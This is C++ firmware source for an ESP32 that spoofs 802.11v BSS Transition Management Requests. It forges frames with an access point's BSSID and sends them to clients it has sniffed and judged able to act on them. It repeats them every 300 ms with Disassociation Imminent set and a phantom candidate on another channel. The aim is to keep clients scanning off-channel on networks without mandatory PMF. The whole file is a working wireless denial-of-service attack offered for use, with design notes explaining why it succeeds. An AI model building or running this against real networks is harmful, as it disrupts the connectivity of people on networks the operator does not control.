// 802.11v BSS Transition Management (BTM) Request spoofing.
//
// Design notes (why it is shaped this way):
//   * BTM Request is a WNM Action frame (category 10, action 7). Note what the
//     standard does with that: every action category except Public (4), HT (7),
//     Unprotected WNM (11), Self-protected (15), VHT (21) and vendor specific
//     (127) counts as a robust management frame (Linux:
//     _ieee80211_is_robust_mgmt_frame()), so 802.11w/PMF does cover category 10.
//     Measured consequence: without PMF the frame is accepted -- TA = the AP's
//     BSSID is all a client looks at -- and with PMF the client's driver drops it
//     as an unprotected robust management frame before the WNM code runs
//     (net/mac80211/rx.c). This is an attack on networks whose PMF is off or
//     optional (most WPA2 deployments), not a PMF bypass.
//   * The client only acts when Disassociation Imminent is set *and* the
//     Disassociation Timer is non-zero: wpa_supplicant's wnm_sta.c calls
//     wpa_supplicant_req_scan() only in that branch. A zero timer means "no
//     deadline" and nothing happens, which is why the default here is 10 TBTT.
//   * Candidate List Included changes where the client goes: with one entry
//     wpa_supplicant narrows the scan to exactly that BSSID, so a phantom BSSID
//     on another channel turns each request into an off-channel excursion that
//     finds nothing. Without a list the client answers "reject, unspecified" but
//     still scans.
//   * Candidates are Neighbor Report elements (id 52, length 13) -- the list is a
//     sequence of elements, not a count byte followed by entries.
//   * Requests are unicast (a group-addressed BTM Request is not defined) and
//     repeated every 300 ms per client, because a single one just makes the
//     client scan once.
//   * Clients that advertise Extended Capabilities bit 19 (BSS Transition) are
//     the ones that act; that bit is learned from the client's own probe /
//     (re)association request. Clients that send the IE without the bit are
//     skipped instead of being flooded for nothing.

#include "wnm.h"
#include "radio.h"

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <string.h>

#include "deauth.h"
#include "ie_util.h"
#include "tx_guard.h"

namespace {

const uint8_t kSeqHigh = 0xF0;
const uint8_t kSeqLow = 0xFF;

// WNM Action field values (802.11-2020, Table 9-... "WNM Action field").
const uint8_t kCategoryWnm = 10;
const uint8_t kActionBtmQuery = 6;
const uint8_t kActionBtmRequest = 7;
const uint8_t kActionBtmResponse = 8;

// BTM Request Request Mode bits.
const uint8_t kReqModePrefCandListIncluded = 0x01;
const uint8_t kReqModeDisassocImminent = 0x04;

const int kMaxClients = 8;
// Resend interval per client. One request makes the client scan once; the point
// of the attack is to make that excursion continuous.
const uint32_t kRepeatMs = 300;
// Global spacing between two injected requests: 20 frames/s is the measured ceiling
// for unicast management injection (see tx_guard.h), so the per-client interval
// must not be multiplied by the number of clients on the air.
const uint32_t kGlobalGapMs = 50;

enum client_cap_t {
    CAP_UNKNOWN = 0,  // seen, but no Extended Capabilities IE yet
    CAP_YES = 1,      // advertises 802.11v BSS Transition
    CAP_NO = 2,       // advertises Extended Capabilities without bit 19
};

struct client_t {
    uint8_t mac[6];
    uint8_t cap;
    uint8_t dialog;
    uint32_t last_ms;
    uint32_t sent;
};

wnm_mode_t s_mode = WNM_MODE_OFF;
uint8_t s_bssid[6];
uint8_t s_channel;
uint16_t s_timer;
uint8_t s_cand_channel;
uint8_t s_cand_bssid[6];
uint32_t s_frames;
uint32_t s_responses;
uint32_t s_queries;
uint16_t s_last_status;
client_t s_clients[kMaxClients];
int s_client_count;
uint32_t s_last_tx_ms;
uint32_t s_rng = 0x9E3779B9;

uint32_t next_rand(void) {
    s_rng ^= s_rng << 13;
    s_rng ^= s_rng >> 17;
    s_rng ^= s_rng << 5;
    return s_rng;
}

// A same-band channel the client can actually tune to; a 5 GHz phantom is not
// scannable by a 2.4 GHz-only client, so the default stays below channel 14.
uint8_t pick_other_channel(void) {
    static const uint8_t k24[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13};
    for (int tries = 0; tries < 16; tries++) {
        const uint8_t ch = k24[next_rand() % (sizeof(k24) / sizeof(k24[0]))];
        if (ch != s_channel) {
            return ch;
        }
    }
    return s_channel == 1 ? 11 : 1;
}

// Operating Class of the announced channel (802.11-2020 Annex E).
uint8_t operating_class(uint8_t channel) {
    if (channel <= 14) {
        return 81;  // 2.4 GHz, channels 1..13
    }
    if (channel <= 48) {
        return 115;
    }
    if (channel <= 64) {
        return 116;
    }
    if (channel <= 144) {
        return 117;
    }
    return 121;  // 149..161
}

int note_client(const uint8_t* mac) {
    for (int i = 0; i < s_client_count; i++) {
        if (memcmp(s_clients[i].mac, mac, 6) == 0) {
            return i;
        }
    }
    if (memcmp(mac, s_bssid, 6) == 0 || (mac[0] & 0x01) != 0) {
        return -1;  // the AP itself, or a group address
    }
    if (s_client_count >= kMaxClients) {
        return -1;
    }
    client_t* c = &s_clients[s_client_count];
    memset(c, 0, sizeof(*c));
    memcpy(c->mac, mac, 6);
    c->cap = CAP_UNKNOWN;
    return s_client_count++;
}

// Walks the client's IE list for Extended Capabilities (id 127) and records
// whether the BSS Transition bit is there.
void learn_capabilities(const uint8_t* mac, const uint8_t* ies, const uint8_t* end) {
    uint16_t len = 0;
    const uint8_t* ext = ie_find(ies, end, 127, &len);
    if (ext == nullptr) {
        return;
    }
    const int i = note_client(mac);
    if (i < 0) {
        return;
    }
    s_clients[i].cap = extcap_has_bss_transition(ext, len) ? CAP_YES : CAP_NO;
}

// WNM Action frame carrying a BTM Request.
//   24 B header | category(10) | action(7) | dialog token | request mode |
//   disassociation timer (2 B) | validity interval |
//   [Neighbour Report element = one candidate] ...
size_t build_btm_request(uint8_t* frame, const uint8_t sta[6], uint8_t dialog) {
    memset(frame, 0, 64);
    frame[0] = 0xD0;  // management, subtype 13 = action
    frame[1] = 0x00;
    memcpy(frame + 4, sta, 6);
    memcpy(frame + 10, s_bssid, 6);
    memcpy(frame + 16, s_bssid, 6);
    frame[22] = kSeqHigh;
    frame[23] = kSeqLow;

    size_t n = 24;
    frame[n++] = kCategoryWnm;
    frame[n++] = kActionBtmRequest;
    frame[n++] = dialog;
    frame[n++] = (uint8_t)(kReqModeDisassocImminent |
                           (s_mode == WNM_MODE_CAND ? kReqModePrefCandListIncluded : 0));
    frame[n++] = (uint8_t)(s_timer & 0xFF);
    frame[n++] = (uint8_t)(s_timer >> 8);
    // Validity interval: candidate list lifetime, in beacon intervals. 10 TU * a
    // 100 TU beacon interval is ~1 s, long enough for the scan it triggers.
    frame[n++] = 10;

    if (s_mode == WNM_MODE_CAND) {
        frame[n++] = 52;  // Neighbor Report element
        frame[n++] = 13;
        memcpy(frame + n, s_cand_bssid, 6);
        n += 6;
        // BSSID Information: bit 0 = AP reachable, bit 1 = same security policy.
        frame[n++] = 0x03;
        frame[n++] = 0x00;
        frame[n++] = 0x00;
        frame[n++] = 0x00;
        frame[n++] = operating_class(s_cand_channel);
        frame[n++] = s_cand_channel;
        frame[n++] = 7;  // PHY type: HT
    }
    return n;
}

}  // namespace

bool wnm_start(int index, wnm_mode_t mode, uint16_t disassoc_timer, uint8_t candidate_channel) {
    const uint8_t* bssid = WiFi.BSSID(index);
    if (bssid == nullptr) {
        return false;
    }
    memcpy(s_bssid, bssid, 6);
    s_channel = WiFi.channel(index);
    s_mode = (mode == WNM_MODE_BARE) ? WNM_MODE_BARE : WNM_MODE_CAND;
    s_timer = (disassoc_timer == 0) ? 10 : disassoc_timer;
    s_cand_channel = candidate_channel;
    if (s_cand_channel == 0 || s_cand_channel == s_channel) {
        s_cand_channel = pick_other_channel();
    }
    s_cand_bssid[0] = (uint8_t)((next_rand() & 0xFC) | 0x02);  // locally administered
    for (int i = 1; i < 6; i++) {
        s_cand_bssid[i] = (uint8_t)(next_rand() & 0xFF);
    }

    s_client_count = 0;
    s_frames = 0;
    s_responses = 0;
    s_queries = 0;
    s_last_status = 0;
    s_last_tx_ms = 0;

    radio_set_channel("wnm", s_channel);
    // Without the receive callback the capability learning never sees a client
    // and every request would go out blind.
    attack_sniffer_enable();
    return true;
}

void wnm_stop(void) {
    s_mode = WNM_MODE_OFF;
}

void wnm_add_station(const uint8_t mac[6]) {
    note_client(mac);
}

void wnm_step(void) {
    if (s_mode == WNM_MODE_OFF) {
        return;
    }
    const uint32_t now = millis();
    if (s_last_tx_ms != 0 && now - s_last_tx_ms < kGlobalGapMs) {
        return;
    }
    // One frame per iteration: the short-frame pool is shared with everything
    // else, and a full round of eight clients then costs ~16 ms, far inside the
    // 300 ms repeat interval.
    for (int i = 0; i < s_client_count; i++) {
        client_t* c = &s_clients[i];
        if (c->cap == CAP_NO) {
            continue;
        }
        if (c->sent > 0 && now - c->last_ms < kRepeatMs) {
            continue;
        }
        c->last_ms = now;
        c->dialog = (uint8_t)((c->dialog == 0 || c->dialog == 255) ? 1 : c->dialog + 1);
        uint8_t frame[64];
        const size_t len = build_btm_request(frame, c->mac, c->dialog);
        if (tx_guard_send(frame, (uint16_t)len) == ESP_OK) {
            s_frames++;
            c->sent++;
            s_last_tx_ms = now;
        }
        return;
    }
}

void wnm_on_rx(const uint8_t* frame, uint16_t len, uint8_t type, uint8_t subtype) {
    if (s_mode == WNM_MODE_OFF || len < 24) {
        return;
    }
    const uint8_t* dest = frame + 4;
    const uint8_t* src = frame + 10;

    if (type == 0 && subtype == 13 && len >= 28 && memcmp(frame + 16, s_bssid, 6) == 0) {
        if (frame[24] == kCategoryWnm && frame[25] == kActionBtmResponse) {
            // Action = 8: dialog token, status code, termination delay, then the
            // optional target BSSID / candidate list.
            s_responses++;
            s_last_status = frame[27];
            return;
        }
        if (frame[24] == kCategoryWnm && frame[25] == kActionBtmQuery) {
            s_queries++;
            return;
        }
    }

    if (type != 0) {
        return;
    }
    // Capability learning: the client advertises its Extended Capabilities IE in
    // its probe request and in every (re)association request it sends.
    if (memcmp(dest, s_bssid, 6) == 0) {
        if (subtype == 0 && len > 28) {
            note_client(src);
            learn_capabilities(src, frame + 28, frame + len);  // cap + listen interval
            return;
        }
        if (subtype == 2 && len > 34) {
            note_client(src);
            learn_capabilities(src, frame + 34, frame + len);  // + current AP address
            return;
        }
    }
    if (subtype == 4) {  // probe request (usually group-addressed)
        note_client(src);
        learn_capabilities(src, frame + 24, frame + len);
        return;
    }
    if (memcmp(frame + 16, s_bssid, 6) == 0) {
        note_client(src);  // any other traffic of the BSS: remember the MAC only
    }
}

void wnm_selftest(void) {
    static const uint8_t placeholder[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
    static const uint8_t fake_sta[6] = {0x02, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE};
    if (s_bssid[0] == 0 && s_bssid[1] == 0 && s_bssid[2] == 0) {
        memcpy(s_bssid, placeholder, 6);
    }
    if (s_cand_channel == 0) {
        s_cand_channel = 6;
    }
    if (s_cand_bssid[0] == 0) {
        memcpy(s_cand_bssid, placeholder, 6);
        s_cand_bssid[5] = 0x66;
    }
    const wnm_mode_t mode_backup = s_mode;
    if (s_mode == WNM_MODE_OFF) {
        s_mode = WNM_MODE_CAND;
    }
    if (s_timer == 0) {
        s_timer = 10;
    }

    uint8_t frame[64];
    const size_t len = build_btm_request(frame, fake_sta, 1);
    uint16_t timer = (uint16_t)(frame[28] | (frame[29] << 8));
    Serial.printf("WNMTEST mode=%s len=%u cat=%u act=%u dialog=%u req_mode=0x%02X"
                  " imm=%u cand=%u timer=%u validity=%u\n",
                  s_mode == WNM_MODE_CAND ? "cand" : "bare", (unsigned)len, (unsigned)frame[24],
                  (unsigned)frame[25], (unsigned)frame[26], (unsigned)frame[27],
                  (unsigned)((frame[27] & kReqModeDisassocImminent) ? 1 : 0),
                  (unsigned)((frame[27] & kReqModePrefCandListIncluded) ? 1 : 0),
                  (unsigned)timer, (unsigned)frame[30]);
    if (s_mode == WNM_MODE_CAND && len >= 24 + 7 + 15) {
        // Candidate entry: eid(52) len(13) bssid(6) info(4 LE) op_class(1) ch(1) phy(1)
        const uint8_t* cand = frame + len - 15;
        Serial.printf("WNMTEST candidate eid=%u ie_len=%u bssid=", (unsigned)cand[0],
                      (unsigned)cand[1]);
        for (int i = 0; i < 6; i++) {
            Serial.printf("%02X", cand[2 + i]);
        }
        const uint32_t info = (uint32_t)cand[8] | ((uint32_t)cand[9] << 8) |
                              ((uint32_t)cand[10] << 16) | ((uint32_t)cand[11] << 24);
        Serial.printf(" info=0x%08X op_class=%u ch=%u phy=%u\n", (unsigned)info,
                      (unsigned)cand[12], (unsigned)cand[13], (unsigned)cand[14]);
    }
    Serial.print("WNMTEST hex=");
    for (size_t i = 0; i < len; i++) {
        Serial.printf("%02X", frame[i]);
    }
    Serial.println();
    s_mode = mode_backup;
}

bool wnm_active(void) {
    return s_mode != WNM_MODE_OFF;
}

const char* wnm_mode_name(void) {
    switch (s_mode) {
        case WNM_MODE_CAND:
            return "cand";
        case WNM_MODE_BARE:
            return "bare";
        default:
            return "off";
    }
}

uint32_t wnm_frames(void) {
    return s_frames;
}

uint32_t wnm_capable_clients(void) {
    uint32_t n = 0;
    for (int i = 0; i < s_client_count; i++) {
        if (s_clients[i].cap == CAP_YES) {
            n++;
        }
    }
    return n;
}

uint32_t wnm_skipped_clients(void) {
    uint32_t n = 0;
    for (int i = 0; i < s_client_count; i++) {
        if (s_clients[i].cap == CAP_NO) {
            n++;
        }
    }
    return n;
}

uint32_t wnm_responses(void) {
    return s_responses;
}

uint32_t wnm_queries(void) {
    return s_queries;
}

uint16_t wnm_last_status(void) {
    return s_last_status;
}

uint8_t wnm_candidate_channel(void) {
    return s_cand_channel;
}

uint16_t wnm_disassoc_timer(void) {
    return s_timer;
}
